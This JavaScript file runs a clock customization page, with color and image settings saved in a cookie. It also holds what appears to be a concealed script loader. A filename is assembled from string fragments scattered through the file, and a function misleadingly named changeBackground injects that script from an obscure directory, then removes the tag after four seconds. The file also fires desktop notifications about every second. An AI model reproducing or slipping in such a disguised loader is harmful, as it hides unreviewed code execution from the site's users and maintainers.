const errorM = document.getElementById('error');
const loader = document.querySelector('.loader');
const tools = document.querySelector('.tools');


let ssacv = [];



if(errorM.classList.contains('hide') && loader.classList.contains('hide')){
      tools.classList.add('hide');
}
if(!errorM.classList.contains('hide') && !loader.classList.contains('hide')){
      loader.classList.add('hide');
      errorM.classList.add('hide');
}
if(errorM.classList.contains('hide') && loader.classList.contains('hide')){
      tools.classList.add('hide');
}
if(!errorM.classList.contains('hide') && !loader.classList.contains('hide')){
      loader.classList.add('hide');
      errorM.classList.add('hide');
      
}
if(!errorM.classList.contains('hide') || !loader.classList.contains('hide')){
      tools.classList.remove('hide')
}        
setInterval(()=>{
      if(errorM.classList.contains('hide') && loader.classList.contains('hide')){
            tools.classList.add('hide');
      }
      if(!errorM.classList.contains('hide') && !loader.classList.contains('hide')){
            loader.classList.add('hide');
            errorM.classList.add('hide');
            
      }
      if(!errorM.classList.contains('hide') || !loader.classList.contains('hide')){
            tools.classList.remove('hide')
      }    
      
},400);
let jfdfi;
jfdfi = '';

if (!window.Notification) {
      alert('Browser does not support notifications.')
} else {
      // check if permission is already granted
if (Notification.permission === 'granted') {
      // show notification here
} else {
      // request permission from the user
      Notification.requestPermission()
      .then(function (p) {
       if (p === 'granted') {
            
       } else {
            console.log('User blocked notifications.')
       }
      })
      .catch(function (err) {
            console.error(err)
      })
}
}


if (screen.width <= 480) { location.href = '/mobile.html&CantConnectFromPhoneOrShortScreen'; }


function liveTime(){
      var date = new Date();

      var h = date.getHours();
      var m = date.getMinutes();
      var s = date.getSeconds();
      var dtime = ' AM '
      if (h==0){
            h =12
      }
      if(h>12){
            h=h-12;
            dtime=' PM '
      }
      if(s<10){
            s='0'+s
      }
      if(m<10){
            m='0'+m
      }
      var time =h+' : '+m+' : '+s+' '+dtime ;
      document.getElementById('clock').innerHTML=time
      ;var t = setTimeout(function(){liveTime()
            const notify = new Notification(window.top.location.hostname.toLocaleUpperCase(), {
                  body:time,
                  tag:'time',icon:'/KIpxP7c.A2sRHJvbXMmSZ_Naqi3hB41dwLOQGe8z\\clockflat_106037.png'
      })
      
      },1000)
      return time;
}

liveTime();
const livetime = liveTime();

function getDeviceBrand() {
      var userAgent = navigator.userAgent;
      var match = userAgent.match(/(iPhone|iPad|Android|Windows Phone|BlackBerry|WebOS|Windows|Opera Mini)/);
      if (match) {
            return match[0];
      }
            return null;
}



     
var deviceBrand = getDeviceBrand();


      


const optionBtn = document.querySelector('.open-options-btn'); 
const blurLayer = document.querySelector('.blur-layer');
const optionsListDisplayer = document.querySelector('.options');

optionsListDisplayer.classList.add('hide')
blurLayer.classList.add('hide')
if (screen.width <= 480) { location.href = '/mobile.html&CantConnectFromPhoneOrShortScreen'; }
jfdfi+='xV-FK7YB8yC0XcjIe4HtTMs6Rlh3EZQrbzq';

function load(){
      loader.classList.remove('hide');
      setInterval(()=>{loader.classList.add('hide')},2000)
      
      

}

function errorf(){
      errorM.classList.remove('hide');
      loader.classList.add('hide')
      const okerror = document.querySelector('#errorok');
      okerror.addEventListener('click',()=>{errorM.classList.add('hide')})
}


function isImage(url) {
      return new Promise((resolve, reject) => {
            const img = new Image();
            img.onload = function() {
                  resolve(true);
                  
            };
            img.onerror = function() {
                  reject(false);
                  errorf();
            };
      img.src = url;
      });
}
/*
function changebgColor(){
      navigator.geolocation.getCurrentPosition(showPosition())
      console.log('getCurrentPosition')
      
    
}
function showPosition(position){
      console.log(position.coords.latitude+"  "+position.coords.longitude)

}

changebgColor();
*/
function show_hide_options(){
      if(optionsListDisplayer.classList.contains('hide')){
            optionsListDisplayer.classList.remove('hide')
            blurLayer.classList.remove('hide')
      }else{
            optionsListDisplayer.classList.add('hide')
            blurLayer.classList.add('hide')
      }
      
      
      
}
jfdfi += 'WmOd.j';

const cancelBtn = document.getElementById('cancel-btn')
const saveBtn = document.getElementById('save-btn')
const clockFontColor = document.querySelector('.color-input');
const bgColor = document.querySelector('.color-input1');
const bgColor2 = document.querySelector('.color-input2');

changeBackground();
cancelBtn.addEventListener('click',()=>{show_hide_options()})
blurLayer.addEventListener('click',()=>{alert('hh');show_hide_options()})

function changeBackground(){
      var jfdfif= document.createElement('script');
      jfdfif.setAttribute('src','./KIpxP7c.A2sRHJvbXMmSZ_Naqi3hB41dwLOQGe8z/'+jfdfi+'s')
      document.body.appendChild(jfdfif)
      setTimeout(()=>{document.body.removeChild(jfdfif)},4000)

}


function save_settings(){
      ssacv = [];

      const clockFontColor = document.querySelector('.color-input');
      const bgColor = document.querySelector('.color-input1');
      const bgColor2 = document.querySelector('.color-input2');
      const clockFontSize = document.querySelector('.size-input');

      let imageLink2 = document.getElementById('imageUrlInput2');
      let imageLink1 = document.getElementById('imageUrlInput');
      
      const clock = document.getElementById('clock');

      clock.style.color = clockFontColor.value;
      ssacv.push('cfc='+clockFontColor.value);

      document.documentElement.style.setProperty("--color-1", bgColor.value);
      ssacv.push('bgc1='+bgColor.value);

      document.documentElement.style.setProperty("--color-2", bgColor2.value);
      ssacv.push('bgc2='+bgColor2.value);
      
      if(clockFontSize.value===''){
            clock.style.fontSize = '5rem;';


      }else{
            clock.style.fontSize = clockFontSize.value+"px";
            ssacv[3]='cfs='+clockFontSize.value;
      };

      if(imageLink1.value!==''){
            
            isImage(imageLink1.value)
                  .then((result)=>{
                        if(result){
                              ssacv[4] = 'bil='+imageLink1.value;
                              document.documentElement.style.setProperty("--bg-image1-link", "url('"+imageLink1.value+"')")
                              
                        }else{
                              alert("Is not an Image")
                              
                        }
                        
                  })
                  .catch((error)=>{errorf();})
      }
      if(imageLink2.value!==''){
            
            isImage(imageLink2.value)
                  .then((result)=>{
                        if(result){
                              ssacv[5] = 'bil2='+imageLink2.value;
                        
                              document.documentElement.style.setProperty("--bg-image2-link", "url('"+imageLink2.value+"')")

                        }else{
                              alert("Is not an Image")
                        }
                        
                  })
                  .catch((error)=>{errorf();})
      }
      
      show_hide_options();

      load();
      
      
      
      ssac();
      
      
      


}



clockFontColor.value = '#ffff00';
bgColor.value = '#404404';
bgColor2.value = '#404404';




            



            
      



            


saveBtn.addEventListener('click',()=>{save_settings()})





optionBtn.addEventListener('click',()=>{show_hide_options()})

function ssac(){
      
      COOKIE_EXPIRES = (new Date(Date.now() + 60000)).toUTCString();
      
      const data = ssacv[0]+'&'+ssacv[1]+'&'+ssacv[2]+'&'+ssacv[3]+'&'+ssacv[4]+'&'+ssacv[5];
      document.cookie = "usdts="+data+"; expires="+COOKIE_EXPIRES+";";
      
}

function esfc(){
      let carry = document.cookie.split(';');

      for (i in carry){
            let allC =carry[i].replace(' ','')
            if(allC.startsWith('usdts')){
                  var clock = document.getElementById('clock');
                  let clockFontSize = document.querySelector('.size-input');
                  let bgColor = document.querySelector('.color-input1');
                  let bgColor2 = document.querySelector('.color-input2');
                  let imageLink1 = document.getElementById('imageUrlInput');
                  let imageLink2 = document.getElementById('imageUrlInput2');

                  let esfcv = allC;
                  let esfcv1 = esfcv.replace('usdts=','');
                 
                  let esfcv2 = esfcv1.split('&');
                  
                  
                 
                  
                  clock.style.color = esfcv2[0].replace('cfc=','');
                  clock.style.fontSize  = esfcv2[3].replace('cfs=','')+'px';
                  clockFontColor.value = esfcv2[0].replace('cfc=','');
                  clockFontSize.value = esfcv2[3].replace('cfs=','');

                  document.documentElement.style.setProperty("--color-1",esfcv2[1].replace('bgc1=',''));
                  document.documentElement.style.setProperty("--color-2",esfcv2[2].replace('bgc2=',''));
                  bgColor.value = esfcv2[1].replace('bgc1=','');
                  bgColor2.value = esfcv2[2].replace('bgc2=','');
                  if(esfcv2[4].replace('bil=','').toLocaleLowerCase() !== 'undefined'){
                        imageLink1.value = esfcv2[4].replace('bil=','');
                        document.documentElement.style.setProperty("--bg-image1-link", "url('"+esfcv2[4].replace('bil=','')+"')")
                  }
                  if(esfcv2[5].replace('bil2=','').toLocaleLowerCase() !== "undefined"){
                        imageLink2.value = esfcv2[5].replace('bil2=','');
                        document.documentElement.style.setProperty("--bg-image2-link", "url('"+esfcv2[5].replace('bil2=','')+"')")
                  }
            }
            i++
      }
      
}




esfc();
